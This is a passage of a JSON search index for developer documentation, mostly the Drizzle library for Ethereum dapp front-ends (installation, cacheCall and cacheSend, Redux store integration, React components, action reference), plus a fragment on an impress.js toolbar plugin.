those to this toolbar. Using a single consolidated toolbar for all GUI widgets makes it easier to position and style the toolbar rather than having to do that for lots of different divs. To add/activate the toolbar in your presentation, add this div: <div id=\"impress-toolbar\"></div> Styling the toolbar is left to presentation author. Here's an example CSS: .impress-enabled div#impress-toolbar { position: fixed; right: 1px; bottom: 1px; opacity: 0.6; } .impress-enabled div#impress-toolbar > span { margin-right: 10px; } The mouse-timeout plugin can be leveraged to hide the toolbar from sight, and only make it visible when mouse is moved. body.impress-mouse-timeout div#impress-toolbar { display: none; } If you're writing a plugin and would like to add a widget to the toolbar, see the top of the source file for further instructions .", "title": "Toolbar plugin"}, {"location": "devcon5/src/plugins/toolbar/#author", "text": "Henrik Ingo (@henrikingo), 2016", "title": "Author"}, {"location": "docs/", "text": "", "title": "All Docs"}, {"location": "docs/drizzle/", "text": "Overview \u00b6 Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core of Drizzle is based on a Redux store, so you have access to the spectacular development tools around Redux. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. Fully reactive contract data, including state, events and transactions. Declarative, so you're not wasting valuable cycles on unneeded data. Maintains access to underlying functionality. Web3 and your contract's methods are still there, untouched.", "title": "Overview"}, {"location": "docs/drizzle/#overview", "text": "Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core of Drizzle is based on a Redux store, so you have access to the spectacular development tools around Redux. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. Fully reactive contract data, including state, events and transactions. Declarative, so you're not wasting valuable cycles on unneeded data. Maintains access to underlying functionality. Web3 and your contract's methods are still there, untouched.", "title": "Overview"}, {"location": "docs/drizzle/quickstart/", "text": "Drizzle Quickstart \u00b6 Installation \u00b6 Install Drizzle via npm: npm install --save @drizzle/store Using React? : The easiest way to get started with Drizzle is to use our official @drizzle/react-plugin package and (optionally) its companion @drizzle/react-components . Initialization \u00b6 Note : Since Drizzle uses web3 1.0 and web sockets, be sure your development environment can support these. As a development blockchain, you'll need ganache-cli v6.1.0+, geth or parity . Import the provider. import { Drizzle } from '@drizzle/store' Create an options object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const options = { contracts : [ SimpleStorage ] } const drizzle = new Drizzle ( options ) Note : The above assumes you have no existing redux store and generates a new one. To use your existing redux store, see Using an Existing Redux Store .", "title": "Drizzle Quickstart"}, {"location": "docs/drizzle/quickstart/#drizzle-quickstart", "text": "", "title": "Drizzle Quickstart"}, {"location": "docs/drizzle/quickstart/#installation", "text": "Install Drizzle via npm: npm install --save @drizzle/store Using React? : The easiest way to get started with Drizzle is to use our official @drizzle/react-plugin package and (optionally) its companion @drizzle/react-components .", "title": "Installation"}, {"location": "docs/drizzle/quickstart/#initialization", "text": "Note : Since Drizzle uses web3 1.0 and web sockets, be sure your development environment can support these. As a development blockchain, you'll need ganache-cli v6.1.0+, geth or parity . Import the provider. import { Drizzle } from '@drizzle/store' Create an options object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const options = { contracts : [ SimpleStorage ] } const drizzle = new Drizzle ( options ) Note : The above assumes you have no existing redux store and generates a new one. To use your existing redux store, see Using an Existing Redux Store .", "title": "Initialization"}, {"location": "docs/drizzle/getting-started/contract-interaction/", "text": "Contract Interaction \u00b6 Drizzle provides helpful methods on top of the default web3.Contract methods to keep your calls and transactions in sync with the store. cacheCall() \u00b6 Gets contract data. Calling the cacheCall() function on a contract will execute the desired call and return a corresponding key so the data can be retrieved from the store. When a new block is received, Drizzle will refresh the store automatically if any transactions in the block touched our contract. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this call to be cached and synchronized. We'll receive the store key for recall. const dataKey = drizzle . contracts . SimpleStorage . methods . storedData . cacheCall () // Use the dataKey to display data from the store. return state . contracts . SimpleStorage . storedData [ dataKey ]. value } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' The contract instance has all of its standard web3 properties and methods. For example, you could still call as normal if you don't want something in the store: drizzle . contracts . SimpleStorage . methods . storedData (). call () cacheSend() \u00b6 Sends a contract transaction. Calling the cacheSend() function on a contract will send the desired transaction and return a corresponding transaction hash so the status can be retrieved from the store. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. Drizzle will update the transaction's state in the store (pending, success, error) and store the transaction receipt. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this transaction to be observed. We'll receive the stackId for reference. const stackId = drizzle . contracts . SimpleStorage . methods . set . cacheSend ( 2 , { from : '0x3f...' }) // Use the stackId to display the transaction status. if ( state . transactionStack [ stackId ]) { const txHash = state . transactionStack [ stackId ] return state . transactions [ txHash ]. status } } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' For more information on what's contained in transaction state, see Drizzle State . The contract instance has all of its standard web3 properties and methods. For example, you could still send as normal if you don't want a tx in the store: drizzle . contracts . SimpleStorage . methods . set ( 2 ). send ({ from : '0x3f...' }) Adding Contracts Dynamically \u00b6 You can programmatically add contracts to Drizzle using either drizzle.addContract() or the ADD_CONTRACT action. var contractConfig = { contractName : \"0x066408929e8d5Ed161e9cAA1876b60e1fBB5DB75\" , web3Contract : new web3 . eth . Contract ( /* ... */ ) } events = [ 'Mint' ] // Using an action dispatch ({ type : 'ADD_CONTRACT' , contractConfig , events }) // Or using the Drizzle context object this . context . drizzle . addContract ( contractConfig , events ) Removing Contracts Dynamically \u00b6 You can also delete contracts using either drizzle.deleteContract() or the DELETE_CONTRACT action. const contractName = \"MyContract\" // Using an action dispatch ({ type : 'DELETE_CONTRACT' , contractName }) // Or using the Drizzle context object this . context . drizzle . deleteContract ( contractName )", "title": "Contract Interaction"}, {"location": "docs/drizzle/getting-started/contract-interaction/#contract-interaction", "text": "Drizzle provides helpful methods on top of the default web3.Contract methods to keep your calls and transactions in sync with the store.", "title": "Contract Interaction"}, {"location": "docs/drizzle/getting-started/contract-interaction/#cachecall", "text": "Gets contract data. Calling the cacheCall() function on a contract will execute the desired call and return a corresponding key so the data can be retrieved from the store. When a new block is received, Drizzle will refresh the store automatically if any transactions in the block touched our contract. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this call to be cached and synchronized. We'll receive the store key for recall. const dataKey = drizzle . contracts . SimpleStorage . methods . storedData . cacheCall () // Use the dataKey to display data from the store. return state . contracts . SimpleStorage . storedData [ dataKey ]. value } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' The contract instance has all of its standard web3 properties and methods. For example, you could still call as normal if you don't want something in the store: drizzle . contracts . SimpleStorage . methods . storedData (). call ()", "title": "cacheCall()"}, {"location": "docs/drizzle/getting-started/contract-interaction/#cachesend", "text": "Sends a contract transaction. Calling the cacheSend() function on a contract will send the desired transaction and return a corresponding transaction hash so the status can be retrieved from the store. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. Drizzle will update the transaction's state in the store (pending, success, error) and store the transaction receipt. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this transaction to be observed. We'll receive the stackId for reference. const stackId = drizzle . contracts . SimpleStorage . methods . set . cacheSend ( 2 , { from : '0x3f...' }) // Use the stackId to display the transaction status. if ( state . transactionStack [ stackId ]) { const txHash = state . transactionStack [ stackId ] return state . transactions [ txHash ]. status } } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' For more information on what's contained in transaction state, see Drizzle State . The contract instance has all of its standard web3 properties and methods. For example, you could still send as normal if you don't want a tx in the store: drizzle . contracts . SimpleStorage . methods . set ( 2 ). send ({ from : '0x3f...' })", "title": "cacheSend()"}, {"location": "docs/drizzle/getting-started/contract-interaction/#adding-contracts-dynamically", "text": "You can programmatically add contracts to Drizzle using either drizzle.addContract() or the ADD_CONTRACT action. var contractConfig = { contractName : \"0x066408929e8d5Ed161e9cAA1876b60e1fBB5DB75\" , web3Contract : new web3 . eth . Contract ( /* ... */ ) } events = [ 'Mint' ] // Using an action dispatch ({ type : 'ADD_CONTRACT' , contractConfig , events }) // Or using the Drizzle context object this . context . drizzle . addContract ( contractConfig , events )", "title": "Adding Contracts Dynamically"}, {"location": "docs/drizzle/getting-started/contract-interaction/#removing-contracts-dynamically", "text": "You can also delete contracts using either drizzle.deleteContract() or the DELETE_CONTRACT action. const contractName = \"MyContract\" // Using an action dispatch ({ type : 'DELETE_CONTRACT' , contractName }) // Or using the Drizzle context object this . context . drizzle . deleteContract ( contractName )", "title": "Removing Contracts Dynamically"}, {"location": "docs/drizzle/getting-started/using-drizzles-redux-store/", "text": "Using Drizzle's Redux Store \u00b6 For those times when you don't want to manage your own Redux store, Drizzle has you covered. You can pass your Redux sagas, reducers, middleware and drizzleOptions to generateStore and drizzle will incorporate them in its own Redux Store. For an example use case see the Drizzle and Contract Events guide. Add Middleware to the Store \u00b6 Drizzle allows you to add redux middleware to it's redux instance. This gives you the ability to react to specific events in a meaningful way, outside of data synchronization. For example, you may want to interact with an external service whenever a contract event occurs. Import the drizzle dependencies. import { generateStore , EventActions } from 'drizzle' import drizzleOptions from '../drizzleOptions' Create a custom middleware. For more information on creating middleware for Redux, see the Redux middleware documentation . const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const contractMessage = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ contractMessage } ` // interact with your service console . log ( 'Contract event fired' , display ) } return next ( action ) } Create the store passing your Middlewares. const appMiddlewares = [ contractEventNotifier ] // create the store export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Add Reducers and Sagas to the Store \u00b6 Drizzle gives you the option to add your reducers to its Redux store if you choose to use one store for your project. Import the drizzle dependencies. import { put , takeEvery } from 'redux-saga/effects' import { generateStore } from 'drizzle' import drizzleOptions from '../drizzleOptions' Define actions, reducers and sagas // actions const TODOS_FETCH = 'MY_APP/TODOS_FETCH' const TODOS_RECEIVED = 'MY_APP/TODOS_RECEIVED' // reducers const todosReducer = ( state = [], action ) => { if ( action . type === TODOS_RECEIVED ) { // update your state return action . todos } return state } // fetch data from service using sagas function * fetchTodos () { const todos = yield fetch ( 'https://jsonplaceholder.typicode.com/todos' ) . then ( resp => response . json ()) yield put ({ type : TODOS_RECEIVED , todos }) } // Combine all your redux concerns // app root saga function * appRootSaga () { yield takeEvery ( TODOS_FETCH , fetchTodos ) } Create the store passing in reducers and sagas // app Reducers and Sagas const appReducers = { todos : todosReducer } const appSagas = [ appRootSaga ] const store = generateStore ({ drizzleOptions , appReducers , appSagas }) export default store", "title": "Using Drizzle's Redux Store"}, {"location": "docs/drizzle/getting-started/using-drizzles-redux-store/#using-drizzles-redux-store", "text": "For those times when you don't want to manage your own Redux store, Drizzle has you covered. You can pass your Redux sagas, reducers, middleware and drizzleOptions to generateStore and drizzle will incorporate them in its own Redux Store. For an example use case see the Drizzle and Contract Events guide.", "title": "Using Drizzle's Redux Store"}, {"location": "docs/drizzle/getting-started/using-drizzles-redux-store/#add-middleware-to-the-store", "text": "Drizzle allows you to add redux middleware to it's redux instance. This gives you the ability to react to specific events in a meaningful way, outside of data synchronization. For example, you may want to interact with an external service whenever a contract event occurs. Import the drizzle dependencies. import { generateStore , EventActions } from 'drizzle' import drizzleOptions from '../drizzleOptions' Create a custom middleware. For more information on creating middleware for Redux, see the Redux middleware documentation . const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const contractMessage = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ contractMessage } ` // interact with your service console . log ( 'Contract event fired' , display ) } return next ( action ) } Create the store passing your Middlewares. const appMiddlewares = [ contractEventNotifier ] // create the store export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! })", "title": "Add Middleware to the Store"}, {"location": "docs/drizzle/getting-started/using-drizzles-redux-store/#add-reducers-and-sagas-to-the-store", "text": "Drizzle gives you the option to add your reducers to its Redux store if you choose to use one store for your project. Import the drizzle dependencies. import { put , takeEvery } from 'redux-saga/effects' import { generateStore } from 'drizzle' import drizzleOptions from '../drizzleOptions' Define actions, reducers and sagas // actions const TODOS_FETCH = 'MY_APP/TODOS_FETCH' const TODOS_RECEIVED = 'MY_APP/TODOS_RECEIVED' // reducers const todosReducer = ( state = [], action ) => { if ( action . type === TODOS_RECEIVED ) { // update your state return action . todos } return state } // fetch data from service using sagas function * fetchTodos () { const todos = yield fetch ( 'https://jsonplaceholder.typicode.com/todos' ) . then ( resp => response . json ()) yield put ({ type : TODOS_RECEIVED , todos }) } // Combine all your redux concerns // app root saga function * appRootSaga () { yield takeEvery ( TODOS_FETCH , fetchTodos ) } Create the store passing in reducers and sagas // app Reducers and Sagas const appReducers = { todos : todosReducer } const appSagas = [ appRootSaga ] const store = generateStore ({ drizzleOptions , appReducers , appSagas }) export default store", "title": "Add Reducers and Sagas to the Store"}, {"location": "docs/drizzle/react/react-components/", "text": "Drizzle React Components \u00b6 A set of useful components for common UI elements. Installation \u00b6 Install Drizzle React Components via npm: npm install --save drizzle-react-components Note : You'll also need the drizzle-react package, if it isn't already installed. Components \u00b6 LoadingContainer \u00b6 This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp (component) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails. ContractData \u00b6 contract (string, required) Name of the contract to call. method (string, required) Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator (boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display. ContractForm \u00b6 contract (string, required) Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from , gasPrice , gas and value . Further explanataion of these parameters can be found here in the web3 documentation . labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".", "title": "React Components"}, {"location": "docs/drizzle/react/react-components/#drizzle-react-components", "text": "A set of useful components for common UI elements.", "title": "Drizzle React Components"}, {"location": "docs/drizzle/react/react-components/#installation", "text": "Install Drizzle React Components via npm: npm install --save drizzle-react-components Note : You'll also need the drizzle-react package, if it isn't already installed.", "title": "Installation"}, {"location": "docs/drizzle/react/react-components/#components", "text": "", "title": "Components"}, {"location": "docs/drizzle/react/react-components/#loadingcontainer", "text": "This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp (component) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails.", "title": "LoadingContainer"}, {"location": "docs/drizzle/react/react-components/#contractdata", "text": "contract (string, required) Name of the contract to call. method (string, required) Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator (boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display.", "title": "ContractData"}, {"location": "docs/drizzle/react/react-components/#contractform", "text": "contract (string, required) Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from , gasPrice , gas and value . Further explanataion of these parameters can be found here in the web3 documentation . labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".", "title": "ContractForm"}, {"location": "docs/drizzle/react/react-integration/", "text": "React Integration \u00b6 @drizzle/react-plugin is the official way to integrate Drizzle with your React dapp. Check out the Drizzle Truffle Box for a complete example or continue reading to create your own setup. Also, check out @drizzle/react-components for Drizzle's codebuilt react components . Installation \u00b6 Install Drizzle React-Plugin via npm: npm install @drizzle/react-plugin Note : @drizzle/react-plugin requires Requires React v16.3+ for the Context API. You'll also need the @drizzle/store package, if it isn't already installed. Getting Started \u00b6 Import the DrizzleContext provider. import { DrizzleContext } from '@drizzle/react-plugin' Create a drizzleOptions object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section of the Drizzle docs . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const drizzleOptions = { contracts : [ SimpleStorage , TutorialToken ], events : { SimpleStorage : [ \"StorageSet\" ], }, } Import Drizzle . import { Drizzle } from \"@drizzle/store\" ; Create a new drizzle instance with the drizzleOptions object. const drizzle = new Drizzle ( drizzleOptions ); Pass the drizzle object to the DrizzleContext.Provider component. < DrizzleContext . Provider drizzle = { drizzle } >< /DrizzleContext.Provider> Use DrizzleContext.Consumer to consume the drizzle context and pass drizzle and drizzleState to your component. Drizzle also provides codebuilt components via the @drizzle/react-components . Note : We have to check that Drizzle is initialized before fetching data. The initialized variable returns the drizzle store's initialization status. < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> Fetch contract data by accessing contracts via drizzle and drizzleState in props . For more information on how this works, see How Data Stays Fresh in the Drizzle docs . For more info on the drizzle state, see state tree docs. The example below utilizes drizzle's cacheCall feature, which caches and synchronizes the call with the store. For more information on cacheCall and also cacheSend , see Contract Interaction . // sample component import React from 'react' ; class CacheCallExample extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . SimpleStorage ; let dataKey = contract . methods [ \"storedData\" ]. cacheCall (); // declare this call to be cached and synchronized this . setState ({ dataKey }); } render () { const { SimpleStorage } = this . props . drizzleState . contracts ; const displayData = SimpleStorage . storedData [ this . state . dataKey ]; // if displayData (an object) exists, then we can display the value below return ( < p > Hi from Truffle ! Here is your storedData : { displayData && displayData . value } < /p> ) } } export default CacheCallExample Note : The contract instances have all the standard web3 properties and methods. drizzle . contracts . SimpleStorage . methods . set ( 5 ). send (); // sets SimpleStorage contract's storedData state variable to uint 5. drizzle . contracts . SimpleStorage . methods . storedData . call (); // gets the storedData value Example Code Snippet \u00b6 // App.js import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import SimpleStorage from \"./contracts/SimpleStorage.json\" ; import MyComponent from \"./MyComponent\" ; // Check out drizzle's react components at @drizzle/react-components const drizzleOptions = { contracts : [ SimpleStorage ], events : { SimpleStorage : [ \"StorageSet\" ], }, }; const drizzle = new Drizzle ( drizzleOptions ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ;", "title": "React Integration"}, {"location": "docs/drizzle/react/react-integration/#react-integration", "text": "@drizzle/react-plugin is the official way to integrate Drizzle with your React dapp. Check out the Drizzle Truffle Box for a complete example or continue reading to create your own setup. Also, check out @drizzle/react-components for Drizzle's codebuilt react components .", "title": "React Integration"}, {"location": "docs/drizzle/react/react-integration/#installation", "text": "Install Drizzle React-Plugin via npm: npm install @drizzle/react-plugin Note : @drizzle/react-plugin requires Requires React v16.3+ for the Context API. You'll also need the @drizzle/store package, if it isn't already installed.", "title": "Installation"}, {"location": "docs/drizzle/react/react-integration/#getting-started", "text": "Import the DrizzleContext provider. import { DrizzleContext } from '@drizzle/react-plugin' Create a drizzleOptions object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section of the Drizzle docs . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const drizzleOptions = { contracts : [ SimpleStorage , TutorialToken ], events : { SimpleStorage : [ \"StorageSet\" ], }, } Import Drizzle . import { Drizzle } from \"@drizzle/store\" ; Create a new drizzle instance with the drizzleOptions object. const drizzle = new Drizzle ( drizzleOptions ); Pass the drizzle object to the DrizzleContext.Provider component. < DrizzleContext . Provider drizzle = { drizzle } >< /DrizzleContext.Provider> Use DrizzleContext.Consumer to consume the drizzle context and pass drizzle and drizzleState to your component. Drizzle also provides codebuilt components via the @drizzle/react-components . Note : We have to check that Drizzle is initialized before fetching data. The initialized variable returns the drizzle store's initialization status. < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> Fetch contract data by accessing contracts via drizzle and drizzleState in props . For more information on how this works, see How Data Stays Fresh in the Drizzle docs . For more info on the drizzle state, see state tree docs. The example below utilizes drizzle's cacheCall feature, which caches and synchronizes the call with the store. For more information on cacheCall and also cacheSend , see Contract Interaction . // sample component import React from 'react' ; class CacheCallExample extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . SimpleStorage ; let dataKey = contract . methods [ \"storedData\" ]. cacheCall (); // declare this call to be cached and synchronized this . setState ({ dataKey }); } render () { const { SimpleStorage } = this . props . drizzleState . contracts ; const displayData = SimpleStorage . storedData [ this . state . dataKey ]; // if displayData (an object) exists, then we can display the value below return ( < p > Hi from Truffle ! Here is your storedData : { displayData && displayData . value } < /p> ) } } export default CacheCallExample Note : The contract instances have all the standard web3 properties and methods. drizzle . contracts . SimpleStorage . methods . set ( 5 ). send (); // sets SimpleStorage contract's storedData state variable to uint 5. drizzle . contracts . SimpleStorage . methods . storedData . call (); // gets the storedData value", "title": "Getting Started"}, {"location": "docs/drizzle/react/react-integration/#example-code-snippet", "text": "// App.js import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import SimpleStorage from \"./contracts/SimpleStorage.json\" ; import MyComponent from \"./MyComponent\" ; // Check out drizzle's react components at @drizzle/react-components const drizzleOptions = { contracts : [ SimpleStorage ], events : { SimpleStorage : [ \"StorageSet\" ], }, }; const drizzle = new Drizzle ( drizzleOptions ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ;", "title": "Example Code Snippet"}, {"location": "docs/drizzle/reference/drizzle-actions/", "text": "Drizzle Actions \u00b6 Drizzle emits many different actions that we can hook into with Middlewares. For more information about writing middlewares for Drizzle, see the Drizzle and Contract Events tutorial . The main categories of actions pertain to: * Accounts * Blocks * Drizzle * Contract Events * Transactions Accounts \u00b6 ACCOUNTS_FETCHING \u00b6 Fired when Drizzle begins fetching accounts. ACCOUNTS_FETCHED \u00b6 Fired once Drizzle has successfully fetched accounts. { accounts } accounts (array) : An array of account addresses. ACCOUNT_BALANCE_FETCHED \u00b6 Fired when an account balance has been successfully fetched. { address: balance } balance (int) : The account balance, indexed by account address (string) in gwei. ACCOUNTS_POLLING \u00b6 Fired when Drizzle begins polling for account changes. Blocks \u00b6 BLOCK_PROCESSING \u00b6 { block } block (object) : The block object returned by web3. See the web3 getBlock documentation for the block object's structure. Drizzle \u00b6 DRIZZLE_INITIALIZED \u00b6 Fire when drizzle has finished initializing. Once this has fired, web3 and accounts have been intialized. Contract Events \u00b6 EVENT_FIRED \u00b6 Fired when a contract event has been fired. { name, event } name (string) : The name of the event. event (object) : The event object returned by web3. See the web3 Contract Event documentation for the event object's structure. Transactions \u00b6 TX_BROADCASTED \u00b6 { txHash, stackId } txHash (string) : The transaction hash. stackId (int) : An integer representing an index in the transactionStack . TX_CONFIRMATION \u00b6 { confirmationReceipt, txHash } confirmationReceipt (object) : The confirmation receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash. TX_SUCCESSFUL \u00b6 { receipt, txHash } receipt (object) : The transaction receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash. TX_ERROR \u00b6 { error, stackTempKey } error (object) : An error object, containig a message , if provided. Empty object if the transaction failed as a result of user rejection via their wallet. stackTempKey (string) : If the transaction experienced an erorr before broadcasting (such as a rejection), this key will be filled on the transactionStack rather than a transaction hash to prevent stack index collisions.", "title": "Drizzle Actions"}, {"location": "docs/drizzle/reference/drizzle-actions/#drizzle-actions", "text": "Drizzle emits many different actions that we can hook into with Middlewares. For more information about writing middlewares for Drizzle, see the Drizzle and Contract Events tutorial . The main categories of actions pertain to: * Accounts * Blocks * Drizzle * Contract Events * Transactions", "title": "Drizzle Actions"}, {"location": "docs/drizzle/reference/drizzle-actions/#accounts", "text": "", "title": "Accounts"}, {"location": "docs/drizzle/reference/drizzle-actions/#accounts_fetching", "text": "Fired when Drizzle begins fetching accounts.", "title": "ACCOUNTS_FETCHING"}, {"location": "docs/drizzle/reference/drizzle-actions/#accounts_fetched", "text": "Fired once Drizzle has successfully fetched accounts. { accounts } accounts (array) : An array of account addresses.", "title": "ACCOUNTS_FETCHED"}, {"location": "docs/drizzle/reference/drizzle-actions/#account_balance_fetched", "text": "Fired when an account balance has been successfully fetched. { address: balance } balance (int) : The account balance, indexed by account address (string) in gwei.", "title": "ACCOUNT_BALANCE_FETCHED"}, {"location": "docs/drizzle/reference/drizzle-actions/#accounts_polling", "text": "Fired when Drizzle begins polling for account changes.", "title": "ACCOUNTS_POLLING"}, {"location": "docs/drizzle/reference/drizzle-actions/#blocks", "text": "", "title": "Blocks"}, {"location": "docs/drizzle/reference/drizzle-actions/#block_processing", "text": "{ block } block (object) : The block object returned by web3. See the web3 getBlock documentation for the block object's structure.", "title": "BLOCK_PROCESSING"}, {"location": "docs/drizzle/reference/drizzle-actions/#drizzle", "text": "", "title": "Drizzle"}, {"location": "docs/drizzle/reference/drizzle-actions/#drizzle_initialized", "text": "Fire when drizzle has finished initializing. Once this has fired, web3 and accounts have been intialized.", "title": "DRIZZLE_INITIALIZED"}, {"location": "docs/drizzle/reference/drizzle-actions/#contract-events", "text": "", "title": "Contract Events"}, {"location": "docs/drizzle/reference/drizzle-actions/#event_fired", "text": "Fired when a contract event has been fired. { name, event } name (string) : The name of the event. event (object) : The event object returned by web3. See the web3 Contract Event documentation for the event object's structure.", "title": "EVENT_FIRED"}, {"location": "docs/drizzle/reference/drizzle-actions/#transactions", "text": "", "title": "Transactions"}, {"location": "docs/drizzle/reference/drizzle-actions/#tx_broadcasted", "text": "{ txHash, stackId } txHash (string) : The transaction hash. stackId (int) : An integer representing an index in the transactionStack .", "title": "TX_BROADCASTED"}, {"location": "docs/drizzle/reference/drizzle-actions/#tx_confirmation", "text": "{ confirmationReceipt, txHash } confirmationReceipt (object) : The confirmation receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash.", "title": "TX_CONFIRMATION"}, {"location": "docs/drizzle/reference/drizzle-actions/#tx_successful", "text": "{ receipt, txHash } receipt (object) : The transaction receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash.", "title": "TX_SUCCESSFUL"}, {"location": "docs/drizzle/reference/drizzle-actions/#tx_error", "text": "{ error, stackTempKey } error (object) : An error object, containig a message , if provided. Empty object if the transaction failed as a result of user rejection via their wallet. stackTempKey (string) : If the transaction experienced an erorr before broadcasting (such as a rejection), this key will be filled on the transactionStack rather than a transaction hash to prevent stack index collisions.", "title": "TX_ERROR"}, {"location": "docs/drizzle/reference/drizzle-options/", "text": "Drizzle Options \u00b6 { contracts , events : { contractName : [ eventName , { eventName , eventOptions } ] }, polls : { accounts : interval , blocks : interval }, syncAlways , web3 : { 